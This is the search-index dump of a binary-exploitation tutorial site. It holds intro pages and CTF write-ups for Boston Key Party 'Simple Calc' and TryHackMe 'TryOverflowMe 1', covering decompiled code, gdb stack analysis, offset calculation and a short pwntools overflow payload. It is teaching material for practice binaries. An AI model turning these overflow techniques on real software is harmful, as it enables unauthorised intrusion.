[{"id":0,"href":"/docs/stack/buffer-overflow-variable/","title":"Buffer Overflow Variable","section":"Stack","content":" Section summary # "},{"id":1,"href":"/docs/background/","title":"Introduction","section":"Docs","content":" Introduction # In this section I will tell you some previous knowledge that is recommended to have before starting to exploit binaries.\nImportant: it is not mandatory to have this knowledge, it is only recommended to make learning easier.\nTable of Contents. # Recommended background knowledge. Tools required. "},{"id":2,"href":"/docs/background/recommended-background-knowledge/","title":"Recommended background knowledge","section":"Introduction","content":" How Computers Work # Before diving into binary exploitation, it\u0026rsquo;s crucial to understand how computers work at a fundamental level. This includes learning about CPU architecture, memory hierarchy, how instructions are executed, and the role of operating systems. Having a solid grasp of these concepts will make it much easier to understand vulnerabilities and how to exploit them effectively.\nLearning Resources. # How the computer works Steve Klabnik How a CPU works and Introduction to Assembler - bin 0x04 How Computers Work: The Basics (Reddit Thread) C Language # One of the first things we must master before learning binary exploitation is the C programming language. Most of the binaries we will analyze and exploit are written in C, and more importantly, the Linux kernel itself is written in C. Understanding how memory management, pointers, and low-level operations work in C is essential for recognizing and exploiting vulnerabilities such as buffer overflows, use-after-free, and format string attacks.\nLearning Resources. # The C Programming Language (K\u0026amp;R) Hopper\u0026rsquo;s Roppers C Training Assembly # Another fundamental skill for binary exploitation is mastering Assembly. This low-level language gives us a deep understanding of how programs interact with the CPU, memory, and registers, allowing us to manipulate execution flow precisely. Most vulnerabilities, such as buffer overflows and return-oriented programming (ROP) attacks, rely on modifying assembly-level instructions. By learning Assembly, we can analyze disassembled binaries, craft payloads, and develop effective exploitation techniques, making it an essential skill for any pwner.\nLearning Resources. # Assembly Crash Course (pwn.college) Assembly Tutorial (GitHub) Intel Developer Manuals "},{"id":3,"href":"/docs/stack/","title":"Stack","section":"Docs","content":" Stack # "},{"id":4,"href":"/docs/stack/buffer-overflow-static/","title":"Buffer Overflow Static","section":"Stack","content":" Section summary # "},{"id":5,"href":"/docs/background/tools-required/","title":"Tools Required","section":"Introduction","content":" Tools Required # pwntools gef "},{"id":6,"href":"/docs/stack/buffer-overflow-static/bkp16_simplecalc/","title":"Simple Calc","section":"Buffer Overflow Static","content":" You can download the binary for this challenge here.\nSimple Calc (Boston Key Party CTF 2016) # We are given a 64-bit binary with the following protections.\n$ checksec simplecalc Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No When executed, the program asks for the number of operations to be performed. Once the number is entered, it allows you to select the desired operation.\n$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 50 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; Reverse engineering and source code analysis # If we open the binary with IDA, we can see the following in the main function.\nint __fastcall main(int argc, const char **argv, const char **envp) { int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d int v7; // edx int v8; // ecx int v9; // r8d int v10; // r9d int v12; // edx int v13; // ecx int v14; // r8d int v15; // r9d char v16; // [rsp+0h] [rbp-50h] char v17; // [rsp+0h] [rbp-50h] _BYTE v18[40]; // [rsp+10h] [rbp-40h] BYREF int v19; // [rsp+38h] [rbp-18h] BYREF int v20; // [rsp+3Ch] [rbp-14h] BYREF __int64 v21; // [rsp+40h] [rbp-10h] int i; // [rsp+4Ch] [rbp-4h] v20 = 0; setvbuf(stdin, 0LL, 2LL, 0LL); setvbuf(stdout, 0LL, 2LL, 0LL); print_motd(); printf((unsigned int)\u0026#34;Expected number of calculations: \u0026#34;, 0, v3, v4, v5, v6, (char)argv); _isoc99_scanf((unsigned int)\u0026#34;%d\u0026#34;, (unsigned int)\u0026amp;v20, v7, v8, v9, v10, v16); handle_newline(); if ( v20 \u0026lt;= 255 \u0026amp;\u0026amp; v20 \u0026gt; 3 ) { v21 = malloc(4 * v20); for ( i = 0; i \u0026lt; v20; ++i ) { print_menu(); _isoc99_scanf((unsigned int)\u0026#34;%d\u0026#34;, (unsigned int)\u0026amp;v19, v12, v13, v14, v15, v17); handle_newline(); switch ( v19 ) { case 1: adds(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4A88; break; case 2: subs(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4AB8; break; case 3: muls(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4AA8; break; case 4: divs(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4A98; break; case 5: memcpy(v18, v21, 4 * v20); free(v21); return 0; default: puts(\u0026#34;Invalid option.\\n\u0026#34;); break; } } free(v21); return 0; } else { puts(\u0026#34;Invalid number.\u0026#34;); return 0; } } The program defines variables of type int and then displays the message Expected number of calculations:. It then waits for user input via scanf(). If the number entered is not in the range 4 to 255, it prints Invalid number. and terminates execution by returning 0. Otherwise, it enters a switch control structure, where it offers five options: add, subtract, multiply and divide numbers, plus a fifth option to exit the program. We can try one of these options.\n$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 5 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 5 $ By choosing option 1, we can add numbers and then exit the program without any problems. This helps us to understand how the binary works.\nExploit Strategy # The program is vulnerable to Buffer Overflow because of the way it handles calculations stored in memory. When a large number of calculations are selected and multiple operations are performed, the program stores the results in memory. When option 5 is chosen, memcpy() is executed, copying the calculations stored in v21 to the variable v18.Checking the variable v18 in the source code we see that it is an array of only 40 bytes, which means that, if we enter more calculations than this buffer can store, a buffer overflow will occur. Let\u0026rsquo;s try it.\n|$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 50 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 5 [1] 11686 segmentation fault (core dumped) ./simplecalc As we can see after entering many calculations the program corrupts.\n"},{"id":7,"href":"/docs/stack/buffer-overflow-variable/tryoverflowme1/","title":"TryOverflowMe 1","section":"Buffer Overflow Variable","content":" TryOverflowMe 1 # We are provided with a 64-bit binary with the following protections.\n$ checksec overflowme1 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No We also have its source code.\nint main(){ setup(); banner(); int admin = 0; char buf[0x10]; puts(\u0026#34;PLease go ahead and leave a comment :\u0026#34;); gets(buf); if (admin){ const char* filename = \u0026#34;flag.txt\u0026#34;; FILE* file = fopen(filename, \u0026#34;r\u0026#34;); char ch; while ((ch = fgetc(file)) != EOF) { putchar(ch); } fclose(file); } else{ puts(\u0026#34;Bye bye\\n\u0026#34;); exit(1); } } Analysis of the source code. # We see that it defines a variable admin with the value of 0, then defines a buffer of 0x10 (16 bytes in decimal), with puts prints the string PLease go ahead and leave a comment : and takes our input with the function gets(), this makes the binary vulnerable to Buffer Overflow because this function does not control the size of our input allowing us to overflow the buffer. Finally with a conditional if it checks if the variable admin is equal to 1, if this is true it opens the flag (flag.txt) and displays it on the screen, if the condition is not met it prints Bye bye and exits the program with a status code 1.\nTo solve this challenge, it is necessary to modify the value of the admin variable to a value other than 0 so that the if condition evaluates to true and the reading of flag.txt is executed. Since gets(buf) allows input without size restrictions, we can exploit a Buffer Overflow to overwrite the admin variable in memory. To do this, we must first determine the exact offset separating the start of the buffer from the address of admin on the stack, which will allow us to calculate the necessary padding. Once the correct offset has been identified, we inject a sequence of bytes containing the padding data followed by the value 0x1 (or any value other than 0) at the corresponding position.\nExploitation. # To calculate the offset we will open the binary using gdb with the extension gef, set a breakpoint in main and execute the binary.\n────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdca0│+0x0000: 0x0000000000000000 ← $rsp 0x00007fffffffdca8│+0x0008: 0x0000000000000000 0x00007fffffffdcb0│+0x0010: 0x0000000000000000 0x00007fffffffdcb8│+0x0018: 0x00007ffff7fe5af0 → \u0026lt;dl_main+0000\u0026gt; endbr64 0x00007fffffffdcc0│+0x0020: 0x00007fffffffddb0 → 0x00000000004006c0 → \u0026lt;_start+0000\u0026gt; xor ebp, ebp 0x00007fffffffdcc8│+0x0028: 0x00007fffffffddf8 → 0x00007fffffffe16e → \u0026quot;/home/abund4nt/pwn/TryHackMe/TryPwnMe One/TryOverF[...]\u0026quot; 0x00007fffffffdcd0│+0x0030: 0x00007fffffffdd70 → 0x00007fffffffddd0 → 0x0000000000000000 ← $rbp 0x00007fffffffdcd8│+0x0038: 0x00007ffff7c2a1ca → \u0026lt;__libc_start_call_main+007a\u0026gt; mov edi, eax ──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── ● 0x4008da \u0026lt;main+0000\u0026gt; push rbp 0x4008db \u0026lt;main+0001\u0026gt; mov rbp, rsp 0x4008de \u0026lt;main+0004\u0026gt; sub rsp, 0x30 → 0x4008e2 \u0026lt;main+0008\u0026gt; mov eax, 0x0 0x4008e7 \u0026lt;main+000d\u0026gt; call 0x4007a2 \u0026lt;setup\u0026gt; 0x4008ec \u0026lt;main+0012\u0026gt; mov eax, 0x0 0x4008f1 \u0026lt;main+0017\u0026gt; call 0x4007e5 \u0026lt;banner\u0026gt; 0x4008f6 \u0026lt;main+001c\u0026gt; mov DWORD PTR [rbp-0x4], 0x0 0x4008fd \u0026lt;main+0023\u0026gt; lea rdi, [rip+0x33c] # 0x400c40 When executing the binary and analyzing its execution flow, it is observed that the program moves the value of register rsp to rbp, thus establishing the stack frame. Subsequently, 0x30 (48 in decimal) is subtracted from rsp, reserving space on the stack for local variables. The mov DWORD PTR [rbp-0x4], 0x0 instruction initializes the admin variable to 0, placing it in rbp-0x4. To determine the offset, the distance between the start of the buffer and the address of admin on the stack must be calculated. Since rsp was decremented by 0x30 and admin is at rbp-0x4, the required offset is 0x30 - 0x4 = 0x2c (44 in decimal). With this value, we can build a payload with 44 bytes of padding followed by a value other than 0 (in this case it will be 1), thus modifying the admin variable and forcing the execution of the code block that prints the flag.\nFlag # To solve the challenge create a script which sends 16 bytes (in A\u0026rsquo;s) for the defined buffer char buf[0x10]; plus 28 bytes (in B\u0026rsquo;s) which represents the padding and finally the value of 1 in 8 bytes (\\x01) to overwrite the variable.\nfrom pwn import * context.binary = ELF(\u0026#39;./overflowme1\u0026#39;) p = process() payload = b\u0026#39;A\u0026#39; * 16 # char buf[0x10]; payload += b\u0026#39;B\u0026#39; * 28 # padding payload += p8(1) p.sendline(payload) p.interactive() By executing it we can obtain the flag.\n$ python3 solve.py Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No [*] Switching to interactive mode ___ ___ ___ /__/\\ /__/\\ / /\\ \\ \\:\\ | |::\\ / /:/ \\__\\:\\ | |:|:\\ / /:/ ___ / /::\\ __|__|:|\\:\\ / /::\\ /__/\\ /:/\\:\\ /__/::::| \\:\\ /__/:/\\:\\ \\ \\:\\/:/__\\/ \\ \\:\\~~\\__\\/ \\__\\/ \\:\\ \\ \\::/ \\ \\:\\ \\ \\:\\ \\ \\:\\ \\ \\:\\ \\__\\/ \\ \\:\\ \\ \\:\\ \\__\\/ \\__\\/ Please go ahead and leave a comment : THM{Oooooooooooooovvvvverrrflloowwwwww} [*] Got EOF while reading in interactive"}]